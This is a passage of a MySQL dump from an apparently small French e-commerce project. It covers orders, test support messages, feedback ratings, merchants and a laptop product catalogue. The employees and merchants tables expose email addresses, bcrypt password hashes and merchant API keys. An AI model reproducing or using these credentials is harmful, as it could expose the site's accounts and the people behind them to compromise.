(72, 98, 'ECO-WFT4I86D9', '[{\"nom\":\"ASUS ExpertBook BM1 BM1503CDA-S70310X\",\"qty\":\"1\",\"pu\":\"719.2\"}]', 719.20, 'paye', '2026-03-30 19:48:42'),
(73, 98, 'ECO-22T1DVO8B', '[{\"nom\":\"ASUS ExpertBook BM1 BM1503CDA-S70310X\",\"qty\":\"1\",\"pu\":\"719.2\"}]', 719.20, 'paye', '2026-03-30 19:51:23'),
(74, 98, 'ECO-EJ45RCSCN', '[{\"nom\":\"ASUS ExpertBook BM1 BM1503CDA-S70310X\",\"qty\":\"1\",\"pu\":\"719.2\"}]', 719.20, 'paye', '2026-03-30 19:55:08'),
(75, 98, 'ECO-D6EXD1EW4', '[{\"nom\":\"ASUS ExpertBook BM1 BM1503CDA-S70310X\",\"qty\":\"1\",\"pu\":\"719.2\"}]', 719.20, 'paye', '2026-03-30 19:57:41'),
(76, 98, 'ECO-1XDAVB2TK', '[{\"nom\":\"ASUS ExpertBook BM1 BM1503CDA-S70310X\",\"qty\":\"1\",\"pu\":\"719.2\"}]', 719.20, 'paye', '2026-03-30 20:14:05'),
(77, 103, 'ECO-R2JIGR1OG', '[{\"nom\":\"ASUS ExpertBook BM1 BM1503CDA-S70310X\",\"qty\":\"1\",\"pu\":\"719.2\"}]', 719.20, 'paye', '2026-03-30 20:19:31'),
(78, 103, 'ECO-UXPX09EO2', '[{\"nom\":\"ASUS ExpertBook BM1 BM1503CDA-S70310X\",\"qty\":\"1\",\"pu\":\"719.2\"}]', 719.20, 'paye', '2026-03-30 20:22:52'),
(79, 103, 'ECO-590TSXP2P', '[{\"nom\":\"ASUS ExpertBook BM1 BM1503CDA-S70310X\",\"qty\":\"1\",\"pu\":\"719.2\"}]', 719.20, 'paye', '2026-03-30 20:25:38'),
(80, 103, 'ECO-YIW1H8VP3', '[{\"nom\":\"ASUS ExpertBook BM1 BM1503CDA-S70310X\",\"qty\":\"1\",\"pu\":\"719.2\"}]', 719.20, 'paye', '2026-03-30 20:26:23'),
(81, 103, 'ECO-NKR7JQO8K', '[{\"nom\":\"Avizar Conduction Osseuse\",\"qty\":\"1\",\"pu\":\"45\"}]', 45.00, 'paye', '2026-03-30 20:29:12'),
(82, 103, 'ECO-PWMR88R7U', '[{\"nom\":\"ASUS ExpertBook BM1 BM1503CDA-S70310X\",\"qty\":\"1\",\"pu\":\"719.2\"}]', 719.20, 'attente', '2026-03-30 20:37:54'),
(83, 103, 'ECO-B87MN370T', '[{\"nom\":\"Avizar Conduction Osseuse\",\"qty\":\"1\",\"pu\":\"45\"}]', 45.00, 'paye', '2026-03-30 20:38:54'),
(84, 94, 'ECO-BSTGX9KYW', '[{\"nom\":\"Avizar Conduction Osseuse\",\"qty\":\"1\",\"pu\":\"45\"}]', 45.00, 'paye', '2026-03-30 20:53:35'),
(85, 98, 'ECO-23BMDTUWT', '[{\"nom\":\"Avizar Conduction Osseuse\",\"qty\":\"1\",\"pu\":\"45\"}]', 45.00, 'paye', '2026-03-30 20:58:36'),
(86, 97, 'ECO-K684VXSBU', '[{\"nom\":\"ASUS ExpertBook B9 OLED B9403CVAR-PP1629X\",\"qty\":\"1\",\"pu\":\"2039.15\"}]', 2039.15, 'paye', '2026-03-31 07:21:43'),
(87, 94, 'ECO-J8TUZETTW', '[{\"nom\":\"Apple iPhone 14 512 Go Lumière Stellaire\",\"qty\":\"2\",\"pu\":\"743.2\"},{\"nom\":\"Avizar Conduction Osseuse\",\"qty\":\"1\",\"pu\":\"45\"}]', 1531.40, 'attente', '2026-03-31 13:53:05'),
(88, 105, 'ECO-58MRZFW8B', '[{\"nom\":\"Avizar Conduction Osseuse\",\"qty\":\"2\",\"pu\":\"45\"}]', 90.00, 'paye', '2026-03-31 14:34:00'),
(89, 112, 'ECO-TQXGV8MJ8', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-04-09 15:33:55'),
(90, 116, 'ECO-AL4UVFO27', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"3\",\"pu\":\"29.9\"}]', 89.70, 'attente', '2026-04-11 19:10:34'),
(91, 119, 'ECO-ZZT5OC3H6', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'attente', '2026-04-11 21:02:12'),
(92, 68, 'ECO-AZPHZXB3R', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'attente', '2026-04-11 21:03:13');

-- --------------------------------------------------------

--
-- Structure de la table `ecotech_customer_messages`
--

DROP TABLE IF EXISTS `ecotech_customer_messages`;
CREATE TABLE IF NOT EXISTS `ecotech_customer_messages` (
  `id_msg` int NOT NULL AUTO_INCREMENT,
  `nom` varchar(50) DEFAULT NULL,
  `prenom` varchar(50) DEFAULT NULL,
  `type_demande` varchar(100) DEFAULT NULL,
  `message` text,
  `date_envoi` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `reponse` text,
  `repondu_par` int DEFAULT NULL,
  `statut` enum('en_attente','traite') DEFAULT 'en_attente',
  `session_id` varchar(100) NOT NULL,
  PRIMARY KEY (`id_msg`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `ecotech_customer_messages`
--

INSERT INTO `ecotech_customer_messages` (`id_msg`, `nom`, `prenom`, `type_demande`, `message`, `date_envoi`, `reponse`, `repondu_par`, `statut`, `session_id`) VALUES
(1, 'eze', 'ezechiel', 'Demande Standard', 'hello', '2026-02-17 19:56:38', 'bonjour monsieur ezechiel en quoi puis je vous aider ? ', 3, 'traite', 'sess_c64lg10ec'),
(2, 'eze', 'ezechiel', 'Demande Standard', 'hello', '2026-02-24 08:05:31', 'top', 8, 'traite', 'sess_c64lg10ec'),
(3, 'eze', 'ezechiel', 'Demande Standard', 'hello', '2026-02-24 08:05:53', 'gn', 8, 'traite', 'sess_c64lg10ec'),
(4, 'eze', 'ezechiel', 'Demande Standard', 'hello', '2026-02-24 08:05:58', 'hello 1', 8, 'traite', 'sess_c64lg10ec'),
(5, 'eze', 'ezechiel', 'Demande Standard', 'hello', '2026-02-24 08:06:46', 'bien reçu', 8, 'traite', 'sess_c64lg10ec'),
(6, 'hello', 'hello', 'Demande Standard', 'bonjour ', '2026-02-27 09:47:43', 'hello ', 8, 'traite', 'sess_c64lg10ec'),
(7, 'boujour', 'bonjours', 'Demande Standard', 'bonjour ', '2026-03-02 14:33:25', 'bonjour monsieur bonjour comment pouvons nous vous aider ? des soucies avec votre commande ?', 8, 'traite', 'sess_c64lg10ec'),
(8, 'hello', 'hello', 'Demande Standard', 'bonjour', '2026-03-22 16:06:05', NULL, NULL, 'en_attente', 'sess_7wyoelvwd'),
(9, 'hello', 'hello', 'Demande Standard', 'bonsoir', '2026-03-22 16:06:25', NULL, NULL, 'en_attente', 'sess_7wyoelvwd'),
(10, 'hello', 'hello', 'Demande Standard', 'hello', '2026-03-22 16:06:38', NULL, NULL, 'en_attente', 'sess_7wyoelvwd'),
(11, 'hello', 'hello', 'Demande Standard', 'hello', '2026-03-22 16:07:11', NULL, NULL, 'en_attente', 'sess_7wyoelvwd'),
(12, 'hello', 'hello', 'Demande Standard', 'bonsoir', '2026-03-22 16:08:14', NULL, NULL, 'en_attente', 'sess_7wyoelvwd');

-- --------------------------------------------------------

--
-- Structure de la table `ecotech_employes`
--

DROP TABLE IF EXISTS `ecotech_employes`;
CREATE TABLE IF NOT EXISTS `ecotech_employes` (
  `id_staff` int NOT NULL AUTO_INCREMENT,
  `nom` varchar(50) DEFAULT NULL,
  `prenom` varchar(100) DEFAULT NULL,
  `email` varchar(100) NOT NULL,
  `password` varchar(255) NOT NULL,
  `service` enum('info','customer') NOT NULL,
  `date_inscription` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id_staff`),
  UNIQUE KEY `email` (`email`)
) ENGINE=MyISAM AUTO_INCREMENT=16 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `ecotech_employes`
--

INSERT INTO `ecotech_employes` (`id_staff`, `nom`, `prenom`, `email`, `password`, `service`, `date_inscription`) VALUES
(6, 'eze@gmail.com', '', 'ezechiel@gmail', '$2y$10$hs9xdlIgoQFguNmmG1pOcOFCi2WAfPXnNa8BTd65ctQT4XNZjh8/K', 'info', '2026-02-27 17:45:05'),
(12, 'amd', 'amd', 'amd@gmail.com', '$2y$10$GQNg.iHDbqcQVeFx/l/8tuslZ9UGbXABGzC0NkQwEZ9tK/YOBgvWW', 'info', '2026-03-20 17:47:46'),
(11, 'amadou ', 'ola', 'aola@ecotech.fr', '$2y$10$Bn7wVoqzpYR04yvJbArY1ei0pIgS.0vqmVr0HLQjd.Zj6gTAiY5iy', 'info', '2026-03-20 17:37:18');

-- --------------------------------------------------------

--
-- Structure de la table `ecotech_feedbacks`
--

DROP TABLE IF EXISTS `ecotech_feedbacks`;
CREATE TABLE IF NOT EXISTS `ecotech_feedbacks` (
  `id` int NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `rating` int NOT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=37 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `ecotech_feedbacks`
--

INSERT INTO `ecotech_feedbacks` (`id`, `user_id`, `rating`, `created_at`) VALUES
(1, 0, 3, '2026-03-21 19:27:46'),
(2, 0, 3, '2026-03-21 19:42:08'),
(3, 0, 1, '2026-03-21 19:43:13'),
(4, 0, 3, '2026-03-21 20:00:03'),
(5, 0, 5, '2026-03-21 20:01:18'),
(6, 0, 5, '2026-03-21 20:24:07'),
(7, 0, 4, '2026-03-21 20:46:44'),
(8, 0, 4, '2026-03-22 13:00:50'),
(9, 0, 4, '2026-03-22 15:38:45'),
(10, 0, 4, '2026-03-22 15:38:46'),
(11, 0, 5, '2026-03-22 15:51:39'),
(12, 0, 5, '2026-03-22 15:54:18'),
(13, 0, 5, '2026-03-23 12:59:56'),
(14, 0, 1, '2026-03-23 21:33:02'),
(15, 0, 1, '2026-03-23 21:57:14'),
(16, 0, 1, '2026-03-23 22:19:50'),
(17, 0, 1, '2026-03-23 22:25:57'),
(18, 0, 2, '2026-03-23 22:41:28'),
(19, 0, 5, '2026-03-25 12:31:28'),
(20, 0, 1, '2026-03-26 17:59:14'),
(21, 0, 1, '2026-03-26 18:08:36'),
(22, 0, 1, '2026-03-26 18:08:58'),
(23, 0, 5, '2026-03-26 22:07:45'),
(24, 0, 5, '2026-03-29 13:02:03'),
(25, 0, 1, '2026-03-29 13:03:06'),
(26, 0, 1, '2026-03-30 19:24:23'),
(27, 0, 4, '2026-03-30 19:26:10'),
(28, 0, 5, '2026-03-30 19:29:54'),
(29, 0, 5, '2026-03-30 19:30:20'),
(30, 0, 5, '2026-03-30 19:57:54'),
(31, 103, 5, '2026-03-30 20:48:15'),
(32, 94, 1, '2026-03-30 20:53:49'),
(33, 98, 3, '2026-03-30 20:58:53'),
(34, 97, 5, '2026-03-31 07:22:55'),
(35, 105, 5, '2026-03-31 14:34:50'),
(36, 112, 4, '2026-04-09 15:34:20');

-- --------------------------------------------------------

--
-- Structure de la table `ecotech_info_messages`
--

DROP TABLE IF EXISTS `ecotech_info_messages`;
CREATE TABLE IF NOT EXISTS `ecotech_info_messages` (
  `id_msg` int NOT NULL AUTO_INCREMENT,
  `nom` varchar(50) DEFAULT NULL,
  `prenom` varchar(50) DEFAULT NULL,
  `type_demande` varchar(100) DEFAULT NULL,
  `message` text,
  `date_envoi` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `reponse` text,
  `repondu_par` int DEFAULT NULL,
  `statut` enum('en_attente','traite') DEFAULT 'en_attente',
  `session_id` varchar(100) NOT NULL,
  PRIMARY KEY (`id_msg`)
) ENGINE=MyISAM AUTO_INCREMENT=20 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `ecotech_info_messages`
--

INSERT INTO `ecotech_info_messages` (`id_msg`, `nom`, `prenom`, `type_demande`, `message`, `date_envoi`, `reponse`, `repondu_par`, `statut`, `session_id`) VALUES
(1, 'eze', 'ezechiel', '', 'hello ', '2026-02-17 19:43:34', 'bonjour ,\r\n\r\nmonsieur ezechiel dites moi comment puis je vous aider ?', 2, 'traite', ''),
(2, 'john', 'pat', 'Demande Standard', 'bonjour', '2026-02-17 21:16:09', 'bonjour monsieur john comment puis vous aider ? ', 1, 'traite', 'sess_c64lg10ec'),
(3, 'eze', 'ezechiel', 'Demande Standard', 'hello ', '2026-02-24 08:06:09', 'bonjour ', 2, 'traite', 'sess_c64lg10ec'),
(4, 'hello', 'hello', 'Demande Standard', '\r\n\r\n\r\n\r\nbonjour \r\n', '2026-02-26 12:18:33', 'bonjour Mr bonjour commen pouvons nous vous aider ', 7, 'traite', 'sess_c64lg10ec'),
(5, 'hello', 'hello', 'Demande Standard', 'hello ', '2026-03-01 12:32:00', 'hello bonjour ', 7, 'traite', 'sess_c64lg10ec'),
(6, 'amadou', 'bafana', 'Demande Standard', 'bonjour  je rencontre des prolbmes avec ma livraison ', '2026-03-03 11:06:10', 'ok voir \r\n', 7, 'traite', 'sess_c64lg10ec'),
(7, 'amd', 'amd', 'Demande Standard', 'bonjour j\'ai une question ', '2026-03-20 17:38:53', 'hello ', 12, 'traite', 'sess_cvgfc28dw'),
(8, 'amd', 'amd', 'Demande Standard', 'hello', '2026-03-20 18:37:30', NULL, NULL, 'en_attente', 'sess_rmmn65h4i'),
(9, 'amd', 'amd', 'Demande Standard', 'hello', '2026-03-20 18:37:30', NULL, NULL, 'en_attente', 'sess_rmmn65h4i'),
(10, 'amd', 'amd', 'Demande Standard', 'hello', '2026-03-20 18:37:32', 'bonjour , monsieur ', 15, 'traite', 'sess_rmmn65h4i'),
(11, 'amd', 'amd', 'Demande Standard', 'hello', '2026-03-20 18:37:32', 'bonsoir', 15, 'traite', 'sess_rmmn65h4i'),
(12, 'hello', 'amd', 'Demande Standard', 'hello', '2026-03-20 18:38:09', 'hello', 12, 'traite', 'sess_cvgfc28dw'),
(13, 'mad', 'hello', 'Demande Standard', 'hello', '2026-03-20 19:45:49', 'bonjour', 12, 'traite', 'sess_cvgfc28dw'),
(14, 'hello', 'hello', 'Demande Standard', 'bonjours', '2026-03-22 16:09:31', NULL, NULL, 'en_attente', 'sess_7wyoelvwd'),
(15, 'hello', 'hello', 'Demande Standard', 'hello', '2026-03-22 16:18:58', NULL, NULL, 'en_attente', 'sess_a1q4kxaef'),
(16, 'hello', 'hello', 'Demande Standard', 'bonjour', '2026-03-22 16:21:33', NULL, NULL, 'en_attente', 'sess_a1q4kxaef'),
(17, 'hello', 'hello', 'Demande Standard', 'bonjour', '2026-03-22 16:21:54', NULL, NULL, 'en_attente', 'sess_a1q4kxaef'),
(18, 'bonjour', 'bonjour', 'Demande Standard', 'hello', '2026-03-22 16:22:49', NULL, NULL, 'en_attente', 'sess_a1q4kxaef'),
(19, 'Hello', 'Hello', 'Demande Standard', 'Bonjour ', '2026-03-22 16:23:27', NULL, NULL, 'en_attente', 'sess_b91o6ec8q');

-- --------------------------------------------------------

--
-- Structure de la table `ecotech_notifications`
--

DROP TABLE IF EXISTS `ecotech_notifications`;
CREATE TABLE IF NOT EXISTS `ecotech_notifications` (
  `id_notif` int NOT NULL AUTO_INCREMENT,
  `id_client` int NOT NULL,
  `titre` varchar(150) NOT NULL,
  `message` text NOT NULL,
  `type_notif` enum('relance','info','facture') DEFAULT 'info',
  `date_envoi` datetime DEFAULT CURRENT_TIMESTAMP,
  `lu` tinyint(1) DEFAULT '0',
  PRIMARY KEY (`id_notif`),
  KEY `id_client` (`id_client`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Structure de la table `ecotech_sales_messages`
--

DROP TABLE IF EXISTS `ecotech_sales_messages`;
CREATE TABLE IF NOT EXISTS `ecotech_sales_messages` (
  `id_msg` int NOT NULL AUTO_INCREMENT,
  `nom` varchar(50) DEFAULT NULL,
  `prenom` varchar(50) DEFAULT NULL,
  `type_demande` varchar(100) DEFAULT NULL,
  `message` text,
  `date_envoi` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `reponse` text,
  `repondu_par` int DEFAULT NULL,
  `statut` enum('en_attente','traite') DEFAULT 'en_attente',
  `session_id` varchar(100) NOT NULL,
  PRIMARY KEY (`id_msg`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Structure de la table `merchants`
--

DROP TABLE IF EXISTS `merchants`;
CREATE TABLE IF NOT EXISTS `merchants` (
  `id` int NOT NULL AUTO_INCREMENT,
  `owner_name` varchar(100) DEFAULT NULL,
  `site_name` varchar(100) DEFAULT NULL,
  `api_key` varchar(64) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `email` varchar(255) DEFAULT NULL,
  `password` varchar(255) NOT NULL,
  `commission_rate` decimal(4,2) DEFAULT '0.05',
  `total_revenue` decimal(15,2) DEFAULT '0.00',
  `total_commissions` decimal(15,2) DEFAULT '0.00',
  PRIMARY KEY (`id`),
  UNIQUE KEY `api_key` (`api_key`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `merchants`
--

INSERT INTO `merchants` (`id`, `owner_name`, `site_name`, `api_key`, `created_at`, `email`, `password`, `commission_rate`, `total_revenue`, `total_commissions`) VALUES
(1, 'ezechiel', 'ezechshop', '7260ae0826972ee2f09915e00eda52ad', '2026-04-08 20:36:11', 'ezechshop@gmail.com', '', 0.05, 0.00, 0.00),
(3, 'eze', 'ezechielshop', 'ad01b95e5cacb2c016ee47e071831ae5', '2026-04-09 15:13:06', 'user8@gmail.com', '$2y$10$uNTPL28momS0LwUdTOGse.ztyuVTlXkP0M..KjuzCp1ESuF4PNY/q', 0.05, 0.00, 0.00),
(4, 'Ezechiel', 'Ecotech-filiale', '9d4b4e36e28bdac67139ff98d097bc78', '2026-04-09 15:55:39', 'user5@gmail.com', '$2y$10$1Zh7poyl0Zipo/pHycirK.ThWC6R0WpSOh0jMAOK7d9m3WwyL8EJq', 0.05, 0.00, 0.00),
(5, 'Ezechiel', 'Ecotech-filiale', NULL, '2026-04-10 13:10:44', 'user5@gmail.com', '$2y$10$M5Hp7tHvDfiFhphw3BHDQe5ybpq3Z6hezYz1YDwZRf4m0TPHTTq1i', 0.05, 0.00, 0.00);

-- --------------------------------------------------------

--
-- Structure de la table `produit`
--

DROP TABLE IF EXISTS `produit`;
CREATE TABLE IF NOT EXISTS `produit` (
  `id_produit` int NOT NULL AUTO_INCREMENT,
  `id_externe` varchar(100) DEFAULT NULL,
  `nom` text NOT NULL,
  `description` text,
  `prix` decimal(10,2) DEFAULT NULL,
  `categories` text NOT NULL,
  `image` text,
  PRIMARY KEY (`id_produit`),
  UNIQUE KEY `id_externe` (`id_externe`)
) ENGINE=MyISAM AUTO_INCREMENT=117 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `produit`
--

INSERT INTO `produit` (`id_produit`, `id_externe`, `nom`, `description`, `prix`, `categories`, `image`) VALUES
(104, 'AR202412200129', 'ASUS ExpertBook B1 B1503CVA-S71360X', 'Intel Core i7-13620H 16 Go SSD 512 Go 15.6\" LED Full HD Wi-Fi 6/Bluetooth Windows 11 Professionnel', 1049.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/20/08/LD0006200814_0006200841.jpg'),
(103, 'AR202506160122', 'ASUS ExpertBook B1 B1403CVA-S65011X', 'Intel Core 5 120U 16 Go SSD 512 Go 14\" LED Full HD Wi-Fi 6/Bluetooth Windows 11 Professionnel', 879.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/25/20/LD0006252014_0006272061.jpg'),
(102, 'AR202412200127', 'ASUS ExpertBook B1 B1403CVA-S61810X', 'Intel Core i7-13620H 32 Go SSD 512 Go 14\" LED Full HD Wi-Fi 6/Bluetooth Windows 11 Professionnel', 1099.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/20/07/LD0006200735_0006200757_0006200784.jpg'),
(101, 'AR202412200126', 'ASUS ExpertBook B1 B1403CVA-S61809X', 'Intel Core i7-13620H 16 Go SSD 512 Go 14\" LED Full HD Wi-Fi 6/Bluetooth Windows 11 Professionnel', 999.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/20/07/LD0006200735_0006200757.jpg'),
(100, 'AR202504070142', 'ASUS ExpertBook B1 B1403CVA-S61634X', 'Intel Core i3-1315U 8 Go SSD 256 Go 14\" LED Full HD Wi-Fi 6/Bluetooth Windows 11 Professionnel', 649.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/28/76/LD0006287628.jpg'),
(99, 'AR202504280072', 'Acer Predator Helios Neo 18 AI PHN18-72-980V', 'Intel Core Ultra 9 275HX 64 Go SSD 2 To 18\" LED QHD+ 240 Hz NVIDIA GeForce RTX 5070 Ti 12 Go Windows 11 Famille', 2499.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/26/33/LD0006263313_0006272787.jpg'),
(98, 'AR202504280071', 'Acer Predator Helios Neo 18 AI PHN18-72-977B', 'Intel Core Ultra 9 275HX 32 Go SSD 1 To 18\" LED QHD+ 240 Hz NVIDIA GeForce RTX 5070 8 Go Windows 11 Famille', 2199.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/26/33/LD0006263313.jpg'),
(97, 'AR202508070065', 'Acer NITRO V 16 AI ANV16-42-R7B0', 'AMD Ryzen 7 260 32 Go SSD 1 To 16\" LED Full HD+ 180 Hz NVIDIA GeForce RTX 5070 8 Go Windows 11 Famille', 1699.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/30/27/LD0006302710.jpg'),
(96, 'AR202507220079', 'Acer TravelMate P2 14 TMP214-56-TCO-53YS', 'Intel Core i5-1334U 8 Go SSD 512 Go 14\" LED Full HD+ Wi-Fi 6E/Bluetooth Windows 11 Professionnel', 829.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/26/42/LD0006264221.jpg'),
(95, 'AR202511130035', 'Acer Swift Go 16 IA SFG16-74-775V Copilot+ PC', 'Intel Core Ultra 7 256V 16 Go SSD 1 To 16\" OLED 120 Hz Wi-Fi 7/Bluetooth Webcam Windows 11 Famille', 1249.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/31/25/LD0006312568.jpg'),
(94, 'AR202504280074', 'Acer Predator Helios 18 AI PH18-73-98VA', 'Intel Core Ultra 9 275HX 64 Go SSD 1 To 18\" Mini-LED 4K RTX 5090 24 Go DLSS 4 Windows 11 Famille', 3999.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/25/72/LD0006257212_0006264440_0006268235.jpg'),
(93, 'AR202504280075', 'Acer Predator Helios 18 AI PH18-73-9498', 'Intel Core Ultra 9 275HX 128 Go SSD 3 To 18\" Mini-LED 4K RTX 5090 24 Go DLSS 4 Windows 11 Famille', 4499.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/25/72/LD0006257212_0006264440.jpg'),
(92, 'AR202504280073', 'Acer Predator Helios 18 AI PH18-73-91FQ', 'Intel Core Ultra 9 275HX 64 Go SSD 1 To 18\" LED QHD+ 250 Hz NVIDIA GeForce RTX 5080 16 Go Windows 11 Famille', 2899.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/25/72/LD0006257212.jpg'),
(91, 'AR202504280067', 'Acer NITRO V 17 AI ANV17-41-R6YK', 'AMD Ryzen 7 260 16 Go SSD 1 To 17.3\" LED Full HD 144 Hz NVIDIA GeForce RTX 5070 8 Go Windows 11 Famille', 1749.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/26/32/LD0006263245.jpg'),
(90, 'AR202504280076', 'Acer Nitro V 15 ANV15-52-91DU', 'Intel Core i9-13900H 32 Go SSD 1 To 15.6\" LED Full HD 165 Hz NVIDIA GeForce RTX 5060 8 Go Windows 11 Famille', 1499.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/25/81/LD0006258178.jpg'),
(89, 'AR202511130090', 'Acer Nitro V 15 ANV15-52-72C0', 'Intel Core i7-13620H 32 Go SSD 1 To 15.6\" LED Full HD 165 Hz NVIDIA GeForce RTX 5050 8 Go Windows 11 Famille', 1299.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/25/81/LD0006258178_0006310135.jpg'),
(88, 'AR202504280068', 'Acer NITRO 18 AI AN18-61-R6MB Copilot+ PC', 'AMD Ryzen 7 350 32 Go SSD 1 To 18\" LED QHD+ 165 Hz NVIDIA GeForce RTX 5070 8 Go DLSS 4 Windows 11 Famille', 1999.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/26/80/LD0006268085.jpg'),
(87, 'AR202511280016', 'Acer Extensa EX215-57-53NW', 'Intel Core i5-1334U 8 Go SSD 512 Go 15.6\" LED Full HD Wi-Fi 6/Bluetooth Webcam Windows 11 Professionnel', 629.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/26/40/LD0006264055_0006301054.jpg'),
(86, 'AR202511250075', 'Acer Aspire Go 16 AG16-71P-91ZT', 'Intel Core i9-13900H 32 Go SSD 1 To 16\" LED Full HD+ Wi-Fi 6/Bluetooth Webcam Windows 11 Famille', 1149.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/31/43/LD0006314340.jpg'),
(85, 'AR202508070063', 'Acer Aspire Go 15 AG15-72P-32YM', 'Intel Core i3-1305U 16 Go SSD 512 Go 15.6\" LED Full HD Wi-Fi 6/Bluetooth Webcam Windows 11 Famille', 499.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/30/01/LD0006300144.jpg'),
(84, 'AR202505140095', 'Acer Aspire Go 15 AG15-71P-5730', 'Intel Core i5-1334U 8 Go SSD 512 Go 15.6\" LED Full HD Wi-Fi 6/Bluetooth Webcam Windows 11 Famille', 529.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/24/53/LD0006245325_0006266808.jpg'),
(83, 'AR202511130034', 'Acer Aspire Go 14 AG14-72P-537T', 'Intel Core 5 120U 16 Go SSD 512 Go 14\" LED Full HD+ Wi-Fi 6/Bluetooth Webcam Windows 11 Famille', 589.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/31/84/LD0006318476.jpg'),
(82, 'AR202511130040', 'Acer Aspire 17 A17-51M-97CP', 'Intel Core i9-13900H 32 Go SSD 1 To 17.3\" LED Full HD Wi-Fi 6E/Bluetooth Webcam Windows 11 Famille', 1399.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/16/42/LD0006164241_0006195978_0006247270_0006318481.jpg'),
(81, 'AR202503130025', 'Acer Aspire 17 A17-51M-72TJ', 'Intel Core i7-13620H 16 Go SSD 1 To 17.3\" LED Full HD Wi-Fi 6E/Bluetooth Webcam Windows 11 Famille', 1049.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/16/42/LD0006164241_0006195978_0006247270.jpg'),
(80, 'AR202412040050', 'Acer Aspire 17 A17-51M-71LP', 'Intel Core 7 150U 16 Go SSD 512 Go 17.3\" LED Full HD Wi-Fi 6E/Bluetooth Webcam Windows 11 Famille', 949.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/16/42/LD0006164241_0006195978.jpg'),
(79, 'AR202503130018', 'Acer Aspire 14 AI A14-52M-784U Copilot+ PC', 'Intel Core Ultra 7 256V 16 Go SSD 512 Go 14\" OLED Full HD+ Wi-Fi 6E/Bluetooth Webcam Windows 11 Famille', 1099.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/28/38/LD0006283825.jpg'),
(78, 'AR202601060040', 'Altyk L16P-I5P32-N2', 'Intel Core i5-1240P 32 Go SSD 1920 Go 16\" LED Full HD+ Wi-Fi 6E Webcam Windows 11 professionnel', 899.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/25/38/LD0006253861_0006310940.jpg'),
(77, 'AR202601060038', 'Altyk L16P-I5P16-N1', 'Intel Core i5-1240P 16 Go SSD 960 Go 16\" LED Full HD+ Wi-Fi 6E Webcam Windows 11 Professionnel', 749.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/25/38/LD0006253849_0006310927.jpg'),
(76, 'AR202505140089', 'Altyk L16P-I3P16-N05', 'Intel Core i3-1220P 16 Go SSD 480 Go 16\" LED Full HD+ Wi-Fi 6E Webcam Windows 11 Professionnel', 599.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/25/38/LD0006253835.jpg'),
